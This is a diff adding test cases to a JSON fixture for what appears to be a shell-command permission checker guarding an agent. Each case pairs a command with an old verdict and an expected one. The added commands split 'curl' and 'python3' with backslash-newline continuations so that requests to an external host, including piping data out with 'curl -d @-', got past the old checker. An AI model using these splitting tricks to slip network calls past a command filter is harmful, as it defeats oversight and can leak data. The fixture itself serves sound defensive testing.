@@ -1727,5 +1727,124 @@
   "command": "\"read\" u <<< \"http://localhost:3420/api/kanban\"; curl \"$u\"",
   "before": "allow",
   "expect": "allow"
+ },
+ {
+  "group": "continued name, curl https external",
+  "form": "cu\\<newline>rl args",
+  "command": "cu\\\nrl -s https://example.com/x",
+  "before": "allow",
+  "expect": "deny"
+ },
+ {
+  "group": "continued name, curl https external",
+  "form": "c\\<newline>url args",
+  "command": "c\\\nurl -s https://example.com/x",
+  "before": "allow",
+  "expect": "deny"
+ },
+ {
+  "group": "continued name, curl https external",
+  "form": "\\<newline>curl args",
+  "command": "\\\ncurl -s https://example.com/x",
+  "before": "deny",
+  "expect": "deny"
+ },
+ {
+  "group": "continued name, curl https external",
+  "form": "\"cu\\<newline>rl\" args",
+  "command": "\"cu\\\nrl\" -s https://example.com/x",
+  "before": "allow",
+  "expect": "deny"
+ },
+ {
+  "group": "continued name, curl https external",
+  "form": "env cu\\<newline>rl args",
+  "command": "env cu\\\nrl -s https://example.com/x",
+  "before": "allow",
+  "expect": "deny"
+ },
+ {
+  "group": "continued name, curl pipe external",
+  "form": "plain (control)",
+  "command": "echo hi | curl -d @- https://example.com/x",
+  "before": "deny",
+  "expect": "deny"
+ },
+ {
+  "group": "continued name, curl pipe external",
+  "form": "cu\\<newline>rl after pipe",
+  "command": "echo hi | cu\\\nrl -d @- https://example.com/x",
+  "before": "allow",
+  "expect": "deny"
+ },
+ {
+  "group": "continued name, python3 -c",
+  "form": "plain (control)",
+  "command": "python3 -c \"import urllib.request as u; u.urlopen('https://example.com/x')\"",
+  "before": "deny",
+  "expect": "deny"
+ },
+ {
+  "group": "continued name, python3 -c",
+  "form": "p\\<newline>ython3 -c CODE",
+  "command": "p\\\nython3 -c \"import urllib.request as u; u.urlopen('https://example.com/x')\"",
+  "before": "allow",
+  "expect": "deny"
+ },
+ {
+  "group": "continued name, python3 -c",
+  "form": "python\\<newline>3 -c CODE",
+  "command": "python\\\n3 -c \"import urllib.request as u; u.urlopen('https://example.com/x')\"",
+  "before": "deny",
+  "expect": "deny"
+ },
+ {
+  "group": "continued argument, curl https external",
+  "form": "curl \\<newline>-s URL",
+  "command": "curl \\\n-s https://example.com/x",
+  "before": "deny",
+  "expect": "deny"
+ },
+ {
+  "group": "continued argument, curl https external",
+  "form": "curl -s \\<newline>URL",
+  "command": "curl -s \\\nhttps://example.com/x",
+  "before": "deny",
+  "expect": "deny"
+ },
+ {
+  "group": "allow control",
+  "form": "'cu\\<newline>rl' args",
+  "command": "'cu\\\nrl' -s https://example.com/x",
+  "before": "allow",
+  "expect": "allow"
+ },
+ {
+  "group": "allow control",
+  "form": "'c\\<newline>url' args",
+  "command": "'c\\\nurl' -s https://example.com/x",
+  "before": "allow",
+  "expect": "allow"
+ },
+ {
+  "group": "allow control",
+  "form": "prose: echo 'x\\<newline>curl URL'",
+  "command": "echo 'x\\\ncurl https://example.com/x'",
+  "before": "allow",
+  "expect": "allow"
+ },
+ {
+  "group": "allow control",
+  "form": "plain (control)",
+  "command": "curl -s http://127.0.0.1:3420/api",
+  "before": "allow",
+  "expect": "allow"
+ },
+ {
+  "group": "allow control",
+  "form": "cu\\<newline>rl args",
+  "command": "cu\\\nrl -s http://127.0.0.1:3420/api",
+  "before": "allow",
+  "expect": "allow"
  }
 ]
